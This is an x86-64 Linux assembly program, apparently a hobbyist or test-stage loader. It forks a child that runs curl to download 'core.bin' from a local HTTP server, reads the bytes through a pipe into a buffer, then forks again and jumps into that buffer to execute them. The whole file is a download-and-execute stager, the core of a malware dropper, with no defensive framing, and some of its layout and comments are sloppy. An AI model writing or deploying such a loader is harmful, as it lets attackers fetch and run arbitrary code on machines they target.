section .data
    path db "/bin/curl", 0             ; the shell path
    arg0 db "curl", 0
    arg1 db "-s", 0
    arg2 db "http://127.0.0.1:5000/core.bin", 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0

argv:
    dq arg0
    dq arg1
    dq arg2
    dq 0

section .bss
    pipefd resd 2


section .text
    global _start

_start:
    ;create a pipe to fuck out output
    lea rdi,pipefd
    mov eax,22   
    syscall

    ;create a childe process using fork
    mov eax, 57
    syscall
    test rax, rax
    jnz parent             ; parent continues

child:
    ; Close read end: fd[0]
    mov rdi, [pipefd]
    mov rax, 3
    syscall

    ; Step 1: Duplicate write end of pipe (pipefd[1]) to stdout (fd 1)
    mov rdi,[pipefd+4]
    mov rsi, 1            ; newfd (destination = stdout)
    mov rax, 33
    syscall

    ; Close write end: fd[1]
    mov rdi, [pipefd+4]
    mov rax, 3
    syscall

    
    mov rdi, path               ; Path to 'ls' (rdi)
    lea rsi, argv          ; Arguments to pass (rsi)
    xor rdx, rdx                 ; Environment variables (set to NULL)
    mov rax, 59                  ; syscall number for execve
    syscall


    ; If execve fails, cexit child process
    jmp _exit                    ; Jump to exit section

parent:
    ; Close write end
    mov rdi, [pipefd+4]
    mov rax, 3
    syscall

    ; read from pipefd[0] into buffer
    mov rdi, [pipefd]
    lea rsi, buffer
    mov rdx, 5000
    xor eax, eax            ; syscall read
    syscall

    ; Close read end
    mov rdi, [pipefd]
    mov rax, 3
    syscall

    ;create a childe process using fork
    mov eax, 57
    syscall
    test rax, rax
    jnz _exit             ; parent continues
    
jump_to_buffer:
    jmp buffer


_exit:
    mov rax, 60     ; syscall: exit
    xor rdi, rdi    ; status = 0
    syscall


buffer: resb 8000
